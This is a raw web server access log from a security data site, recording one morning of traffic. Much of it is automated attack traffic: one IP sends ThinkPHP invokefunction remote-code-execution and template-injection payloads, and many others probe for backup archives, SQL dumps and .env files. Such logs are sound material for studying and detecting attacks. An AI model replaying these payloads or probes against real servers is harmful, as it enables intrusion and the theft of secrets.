40.77.167.77 - - [09/Mar/2024:02:39:04 -0800] "GET /self.logs/access.log.2017-01-01.gz HTTP/1.1" 200 17634 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36" 
43.226.17.13 - - [09/Mar/2024:05:57:16 -0800] "POST //login HTTP/1.1" 404 250 "http://www.secrepo.com//login" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:16 -0800] "POST //xxl-job-admin/login HTTP/1.1" 404 250 "http://www.secrepo.com//xxl-job-admin/login" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:17 -0800] "POST //file.php HTTP/1.1" 404 250 "http://www.secrepo.com//file.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:17 -0800] "POST //client.do HTTP/1.1" 418 691 "http://www.secrepo.com//client.do" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:17 -0800] "POST //addons/caiji/update.php?name=admin HTTP/1.1" 404 250 "http://www.secrepo.com//addons/caiji/update.php?name=admin" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:18 -0800] "POST //addons/collect/update.php?name=admin HTTP/1.1" 404 250 "http://www.secrepo.com//addons/collect/update.php?name=admin" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:18 -0800] "POST //addons/admin/update.php?name=admin HTTP/1.1" 404 250 "http://www.secrepo.com//addons/admin/update.php?name=admin" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:19 -0800] "POST //addons/farcj/update.php?name=admin HTTP/1.1" 404 250 "http://www.secrepo.com//addons/farcj/update.php?name=admin" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:19 -0800] "POST //index.php?s=/admin/public/login.html HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?s=/admin/public/login.html" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:19 -0800] "GET //type.php?template=tag_()%7B%7D;@unlink(_FILE_);die(md5(geerdan));%7B//../rss HTTP/1.1" 418 691 "http://www.secrepo.com//type.php?template=tag_(){};@unlink(_FILE_);die(md5(geerdan));{//../rss" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:20 -0800] "POST //caches/configs/system.php HTTP/1.1" 404 250 "http://www.secrepo.com//caches/configs/system.php" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:20 -0800] "POST //cms/manage/admin.php?m=manage&c=background&a=action_flashUpload HTTP/1.1" 404 250 "http://www.secrepo.com//cms/manage/admin.php?m=manage&c=background&a=action_flashUpload" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:20 -0800] "GET //?a=display&templateFile=README.md HTTP/1.1" 200 49055 "http://www.secrepo.com//?a=display&templateFile=README.md" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:21 -0800] "GET //?a=display&templateFile=Nginx.conf HTTP/1.1" 200 49055 "http://www.secrepo.com//?a=display&templateFile=Nginx.conf" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:21 -0800] "GET //?a=fetch&content=%3Cphp%3Edie(@md5(dakaishajie))%3C/php%3E HTTP/1.1" 200 49055 "http://www.secrepo.com//?a=fetch&content=<php>die(@md5(dakaishajie))</php>" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:22 -0800] "GET //?a=display&templateFile=simplewind/Core/Library/Vendor/README.txt HTTP/1.1" 200 49055 "http://www.secrepo.com//?a=display&templateFile=simplewind/Core/Library/Vendor/README.txt" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:22 -0800] "GET //index.php/module/action/param1/$%7B@print(md5(chaonan))%7D HTTP/1.1" 404 250 "http://www.secrepo.com//index.php/module/action/param1/$%7B@print(md5(chaonan))%7D" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:22 -0800] "GET //index.php?s=/aa/bb/name/$%7B@print(md5(chaonan))%7D HTTP/1.1" 404 250 "http://www.secrepo.com//index.php?s=/aa/bb/name/$%7B@print(md5(chaonan))%7D" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:22 -0800] "GET //?s=/aa/bb/name/$%7B@print(md5(chaonan))%7D HTTP/1.1" 200 49055 "http://www.secrepo.com//?s=/aa/bb/name/$%7B@print(md5(chaonan))%7D" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:22 -0800] "GET //index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:23 -0800] "POST //index.php?s=captcha HTTP/1.1" 404 250 "http://www.secrepo.com//index.php?s=captcha" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:23 -0800] "GET //?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//?function=call_user_func_array&s=%2FIndex%2F%5Cthink%5Capp%2Finvokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:23 -0800] "POST //?s=captcha HTTP/1.1" 200 49055 "http://www.secrepo.com//?s=captcha" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:24 -0800] "GET //?s=%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=print%20md5(%27chaonan%27)&vars%5B1%5D%5B%5D=1 HTTP/1.1" 418 691 "http://www.secrepo.com//?s=\\think\\app/invokefunction&function=assert&vars[0]=print%20md5(%27chaonan%27)&vars[1][]=1" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:24 -0800] "POST //?s=index HTTP/1.1" 200 49055 "http://www.secrepo.com//?s=index" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:25 -0800] "GET //?s=admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:25 -0800] "GET //?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=print%20md5(%27chaonan%27)&vars%5B1%5D%5B%5D=1 HTTP/1.1" 418 691 "http://www.secrepo.com//?s=index/\\think\\app/invokefunction&function=assert&vars[0]=print%20md5(%27chaonan%27)&vars[1][]=1" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:25 -0800] "GET //?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=print%20md5(%27chaonan%27)&vars%5B1%5D%5B%5D=1 HTTP/1.1" 418 691 "http://www.secrepo.com//?s=index/\\think\\Container/invokefunction&function=assert&vars[0]=print%20md5(%27chaonan%27)&vars[1][]=1" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:25 -0800] "GET //?function=call_user_func_array&s=/user/%5Cthink%5Capp/invokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//?function=call_user_func_array&s=/user/\\think\\app/invokefunction&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:26 -0800] "GET //?function=call_user_func_array&s=/Index/%5Cthink%5CContainer/invokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//?function=call_user_func_array&s=/Index/\\think\\Container/invokefunction&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:26 -0800] "GET //?s=api/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//?s=api/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:26 -0800] "GET //inex.php?s=%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=print%20md5(%27chaonan%27)&vars%5B1%5D%5B%5D=1 HTTP/1.1" 418 691 "http://www.secrepo.com//inex.php?s=\\think\\app/invokefunction&function=assert&vars[0]=print%20md5(%27chaonan%27)&vars[1][]=1" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:26 -0800] "POST //index.php?s=captcha HTTP/1.1" 404 250 "http://www.secrepo.com//index.php?s=captcha" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:27 -0800] "POST //?s=captcha HTTP/1.1" 200 49055 "http://www.secrepo.com//?s=captcha" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:27 -0800] "POST //index.php?s=captcha HTTP/1.1" 404 250 "http://www.secrepo.com//index.php?s=captcha" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:28 -0800] "POST //?s=captcha HTTP/1.1" 200 49055 "http://www.secrepo.com//?s=captcha" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:28 -0800] "POST //index.php?s=index HTTP/1.1" 404 250 "http://www.secrepo.com//index.php?s=index" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:29 -0800] "POST //?s=index HTTP/1.1" 200 49055 "http://www.secrepo.com//?s=index" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:30 -0800] "POST //index.php/Index//think/app/invokefunction HTTP/1.1" 404 250 "http://www.secrepo.com//index.php/Index/%5Cthink%5Capp/invokefunction" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:30 -0800] "POST //?s=/Index/%5Cthink%5Capp/invokefunction HTTP/1.1" 200 49055 "http://www.secrepo.com//?s=/Index/\\think\\app/invokefunction" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:31 -0800] "POST // HTTP/1.1" 200 49055 "http://www.secrepo.com//" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:31 -0800] "POST //index.php?s=index HTTP/1.1" 404 250 "http://www.secrepo.com//index.php?s=index" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:32 -0800] "GET //index.php?s=admin/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?s=admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:32 -0800] "GET //index.php?s=index/%5Cthink%5Capp/invokefunction&function=assert&vars%5B0%5D=print%20md5(%27chaonan%27)&vars%5B1%5D%5B%5D=1 HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?s=index/\\think\\app/invokefunction&function=assert&vars[0]=print%20md5(%27chaonan%27)&vars[1][]=1" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:32 -0800] "GET //index.php?s=index/%5Cthink%5CContainer/invokefunction&function=assert&vars%5B0%5D=print%20md5(%27chaonan%27)&vars%5B1%5D%5B%5D=1 HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?s=index/\\think\\Container/invokefunction&function=assert&vars[0]=print%20md5(%27chaonan%27)&vars[1][]=1" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:32 -0800] "GET //index.php?function=call_user_func_array&s=/user/%5Cthink%5Capp/invokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?function=call_user_func_array&s=/user/\\think\\app/invokefunction&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:32 -0800] "GET //index.php?function=call_user_func_array&s=/Index/%5Cthink%5CContainer/invokefunction&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?function=call_user_func_array&s=/Index/\\think\\Container/invokefunction&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:33 -0800] "GET //index.php?s=api/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=printf&vars%5B1%5D%5B%5D=77770123 HTTP/1.1" 418 691 "http://www.secrepo.com//index.php?s=api/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=77770123" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:33 -0800] "GET //index.php/home/Forum/index?model=Forum&temp=Public/Home/css/weiphp.css HTTP/1.1" 404 250 "http://www.secrepo.com//index.php/home/Forum/index?model=Forum&temp=Public/Home/css/weiphp.css" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
43.226.17.13 - - [09/Mar/2024:05:57:33 -0800] "POST //index.php?c=uploadfile&a=uploadify_upload&type=php&size=1000 HTTP/1.1" 404 250 "http://www.secrepo.com//index.php?c=uploadfile&a=uploadify_upload&type=php&size=1000" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0" 
45.131.176.85 - - [09/Mar/2024:06:02:26 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
107.20.105.74 - - [09/Mar/2024:06:06:40 -0800] "HEAD / HTTP/1.1" 301 186 "-" "DreamHost SiteMonitor 1.0" 
107.20.105.74 - - [09/Mar/2024:06:06:40 -0800] "HEAD / HTTP/1.1" 200 359 "http://66.33.221.139" "DreamHost SiteMonitor 1.0" 
98.159.226.248 - - [09/Mar/2024:06:13:00 -0800] "HEAD /mysql.sql HTTP/1.1" 301 176 "-" "-" 
98.159.226.251 - - [09/Mar/2024:06:13:00 -0800] "HEAD /mysql.sql HTTP/1.1" 404 265 "-" "-" 
98.159.226.251 - - [09/Mar/2024:06:15:06 -0800] "HEAD /back/mysql.sql HTTP/1.1" 301 181 "-" "-" 
98.159.226.247 - - [09/Mar/2024:06:15:07 -0800] "HEAD /back/mysql.sql HTTP/1.1" 404 265 "-" "-" 
107.20.105.74 - - [09/Mar/2024:06:16:40 -0800] "HEAD / HTTP/1.1" 301 186 "-" "DreamHost SiteMonitor 1.0" 
107.20.105.74 - - [09/Mar/2024:06:16:40 -0800] "HEAD / HTTP/1.1" 200 359 "http://66.33.221.139" "DreamHost SiteMonitor 1.0" 
45.86.201.5 - - [09/Mar/2024:06:17:57 -0800] "HEAD /backups/backup.sql HTTP/1.1" 301 185 "-" "-" 
45.86.201.9 - - [09/Mar/2024:06:17:58 -0800] "HEAD /backups/backup.sql HTTP/1.1" 404 265 "-" "-" 
45.86.201.2 - - [09/Mar/2024:06:19:26 -0800] "HEAD /backups/public_html.tar.gz HTTP/1.1" 301 193 "-" "-" 
45.86.201.5 - - [09/Mar/2024:06:19:26 -0800] "HEAD /backups/public_html.tar.gz HTTP/1.1" 404 265 "-" "-" 
212.30.36.147 - - [09/Mar/2024:06:21:13 -0800] "HEAD /restore/backup.zip HTTP/1.1" 301 185 "-" "-" 
212.30.36.132 - - [09/Mar/2024:06:21:14 -0800] "HEAD /restore/backup.zip HTTP/1.1" 404 265 "-" "-" 
114.119.155.236 - - [09/Mar/2024:06:25:33 -0800] "GET /self.logs/error.log.2020-01-10 HTTP/1.1" 200 2350 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
185.195.237.146 - - [09/Mar/2024:06:25:55 -0800] "HEAD /backup/secrepo.com.gz HTTP/1.1" 301 188 "-" "-" 
185.195.237.150 - - [09/Mar/2024:06:25:56 -0800] "HEAD /backup/secrepo.com.gz HTTP/1.1" 404 265 "-" "-" 
107.20.105.74 - - [09/Mar/2024:06:26:40 -0800] "HEAD / HTTP/1.1" 301 186 "-" "DreamHost SiteMonitor 1.0" 
107.20.105.74 - - [09/Mar/2024:06:26:40 -0800] "HEAD / HTTP/1.1" 200 359 "http://66.33.221.139" "DreamHost SiteMonitor 1.0" 
212.30.36.140 - - [09/Mar/2024:06:27:14 -0800] "HEAD /back/www.sql HTTP/1.1" 301 179 "-" "-" 
212.30.36.168 - - [09/Mar/2024:06:27:15 -0800] "HEAD /back/www.sql HTTP/1.1" 404 265 "-" "-" 
98.159.226.253 - - [09/Mar/2024:06:27:37 -0800] "HEAD /back/Archive.zip HTTP/1.1" 301 183 "-" "-" 
98.159.226.247 - - [09/Mar/2024:06:27:37 -0800] "HEAD /back/Archive.zip HTTP/1.1" 404 265 "-" "-" 
212.30.36.140 - - [09/Mar/2024:06:27:44 -0800] "HEAD /ftpsync.settings HTTP/1.1" 301 183 "-" "-" 
212.30.36.154 - - [09/Mar/2024:06:27:44 -0800] "HEAD /ftpsync.settings HTTP/1.1" 404 265 "-" "-" 
212.30.36.148 - - [09/Mar/2024:06:31:33 -0800] "HEAD /bak/www.rar HTTP/1.1" 301 178 "-" "-" 
212.30.36.132 - - [09/Mar/2024:06:31:33 -0800] "HEAD /bak/www.rar HTTP/1.1" 404 265 "-" "-" 
185.195.237.146 - - [09/Mar/2024:06:32:39 -0800] "HEAD /restore/web.zip HTTP/1.1" 301 182 "-" "-" 
185.195.237.149 - - [09/Mar/2024:06:32:40 -0800] "HEAD /restore/web.zip HTTP/1.1" 404 265 "-" "-" 
198.235.24.142 - - [09/Mar/2024:06:33:51 -0800] "GET / HTTP/1.1" 429 420 "-" "-" 
107.20.105.74 - - [09/Mar/2024:06:36:40 -0800] "HEAD / HTTP/1.1" 301 186 "-" "DreamHost SiteMonitor 1.0" 
107.20.105.74 - - [09/Mar/2024:06:36:40 -0800] "HEAD / HTTP/1.1" 200 359 "http://66.33.221.139" "DreamHost SiteMonitor 1.0" 
212.30.36.138 - - [09/Mar/2024:06:40:11 -0800] "HEAD /restore/latest.zip HTTP/1.1" 301 185 "-" "-" 
212.30.36.112 - - [09/Mar/2024:06:40:11 -0800] "HEAD /restore/latest.zip HTTP/1.1" 404 265 "-" "-" 
45.86.201.5 - - [09/Mar/2024:06:41:22 -0800] "HEAD /bak/www.gz HTTP/1.1" 301 177 "-" "-" 
45.86.201.4 - - [09/Mar/2024:06:41:23 -0800] "HEAD /bak/www.gz HTTP/1.1" 404 265 "-" "-" 
107.20.105.74 - - [09/Mar/2024:06:46:40 -0800] "HEAD / HTTP/1.1" 301 186 "-" "DreamHost SiteMonitor 1.0" 
107.20.105.74 - - [09/Mar/2024:06:46:40 -0800] "HEAD / HTTP/1.1" 200 359 "http://66.33.221.139" "DreamHost SiteMonitor 1.0" 
212.30.36.147 - - [09/Mar/2024:06:46:52 -0800] "HEAD /backup/directory.zip HTTP/1.1" 301 187 "-" "-" 
212.30.36.107 - - [09/Mar/2024:06:46:53 -0800] "HEAD /backup/directory.zip HTTP/1.1" 404 265 "-" "-" 
114.119.139.166 - - [09/Mar/2024:06:47:25 -0800] "GET /self.logs/error.log.2021-01-04 HTTP/1.1" 200 351 "http://www.secrepo.com/self.logs?C=N%3BO%3DD" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)" 
23.248.195.122 - - [09/Mar/2024:06:48:02 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4280.67 Safari/537.36 Edg/97.0.664.52" 
185.192.71.206 - - [09/Mar/2024:06:49:29 -0800] "HEAD /directory.tar.gz HTTP/1.1" 301 183 "-" "-" 
91.230.225.156 - - [09/Mar/2024:06:49:30 -0800] "HEAD /directory.tar.gz HTTP/1.1" 404 265 "-" "-" 
45.86.201.3 - - [09/Mar/2024:06:50:10 -0800] "HEAD /backup/bak.rar HTTP/1.1" 301 181 "-" "-" 
45.86.201.3 - - [09/Mar/2024:06:50:11 -0800] "HEAD /backup/bak.rar HTTP/1.1" 404 265 "-" "-" 
98.159.226.252 - - [09/Mar/2024:06:52:18 -0800] "HEAD /latest.zip HTTP/1.1" 301 177 "-" "-" 
98.159.226.251 - - [09/Mar/2024:06:52:19 -0800] "HEAD /latest.zip HTTP/1.1" 404 265 "-" "-" 
171.13.14.38 - - [09/Mar/2024:06:55:19 -0800] "GET / HTTP/1.1" 200 13141 "https://www.sec-wiki.com/news?News_page=1267" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36" 
45.95.243.29 - - [09/Mar/2024:06:56:10 -0800] "HEAD /old/backup.rar HTTP/1.1" 301 181 "-" "-" 
45.95.243.162 - - [09/Mar/2024:06:56:10 -0800] "HEAD /old/backup.rar HTTP/1.1" 404 265 "-" "-" 
212.30.36.155 - - [09/Mar/2024:06:56:24 -0800] "HEAD /back/archive.zip HTTP/1.1" 301 183 "-" "-" 
212.30.36.144 - - [09/Mar/2024:06:56:25 -0800] "HEAD /back/archive.zip HTTP/1.1" 404 265 "-" "-" 
107.20.105.74 - - [09/Mar/2024:06:56:40 -0800] "HEAD / HTTP/1.1" 301 186 "-" "DreamHost SiteMonitor 1.0" 
107.20.105.74 - - [09/Mar/2024:06:56:40 -0800] "HEAD / HTTP/1.1" 200 359 "http://66.33.221.139" "DreamHost SiteMonitor 1.0" 
45.95.243.28 - - [09/Mar/2024:06:57:46 -0800] "HEAD /old/sql.sql HTTP/1.1" 301 178 "-" "-" 
45.95.243.44 - - [09/Mar/2024:06:57:47 -0800] "HEAD /old/sql.sql HTTP/1.1" 404 265 "-" "-" 
45.95.243.19 - - [09/Mar/2024:06:59:14 -0800] "HEAD /backup/.env HTTP/1.1" 301 178 "-" "-" 
45.95.243.28 - - [09/Mar/2024:06:59:15 -0800] "HEAD /backup/.env HTTP/1.1" 404 265 "-" "-" 
185.51.134.229 - - [09/Mar/2024:07:00:05 -0800] "HEAD /restore/backup.sql.gz HTTP/1.1" 301 188 "-" "-" 
185.51.134.229 - - [09/Mar/2024:07:00:06 -0800] "HEAD /restore/backup.sql.gz HTTP/1.1" 404 265 "-" "-" 
185.192.71.218 - - [09/Mar/2024:07:01:31 -0800] "HEAD /back/www.rar HTTP/1.1" 301 179 "-" "-" 
185.92.25.81 - - [09/Mar/2024:07:01:31 -0800] "HEAD /back/www.rar HTTP/1.1" 404 265 "-" "-" 
66.249.79.236 - - [09/Mar/2024:07:01:51 -0800] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.94 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
